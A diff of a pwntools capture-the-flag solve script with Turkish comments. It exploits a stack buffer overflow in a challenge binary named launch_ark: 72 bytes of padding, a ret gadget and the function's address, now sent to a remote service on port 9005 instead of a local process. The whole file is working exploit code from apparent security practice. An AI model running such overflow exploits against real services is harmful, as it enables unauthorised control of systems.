@@ -1,29 +1,20 @@
-# solve.py
 from pwn import *
 
-# 1. Binary'i yükle
-binary_path = "./launch_ark"
-elf = ELF(binary_path)
+# Hedef sunucu bilgisi
+HOST = 'localhost' # veya uzak sunucu IP'si
+PORT = 9005
 
-# 2. launch_ark() fonksiyonunun adresini al
+elf = ELF('./challenges/signal-05-pwn/launch_ark')
 target_func = elf.symbols['launch_ark']
-print(f"[+] launch_ark adresi: {hex(target_func)}")
-
-# 3. Stack düzeni:
-# auth_buffer = 64 bayt
-# Kaydedilen RBP = 8 bayt
-# Toplam ofset = 72 bayt
-# Ekstra ret adresi (x86_64 stack 16-byte alignment sorunu icin)
-ret_gadget = target_func + 1 # veya binary'deki herhangi bir 'ret' adresi
+ret_gadget = target_func + 1 # Stack 16-byte alignment
 
 offset = 72
 payload = b"A" * offset + p64(ret_gadget) + p64(target_func)
 
-# 4. Süreci başlat ve payload'u gönder
-io = process(binary_path)
+# Uzak servise bağlan
+io = remote(HOST, PORT)
 io.recvuntil(b"[?] ATESLEME KONTROL PROTOKOLUNU GIRIN: ")
 io.sendline(payload)
 
-# 5. Bayrağı yakala
-output = io.recvall().decode(errors='ignore')
-print(output)
+# Flag'i al
+io.interactive()
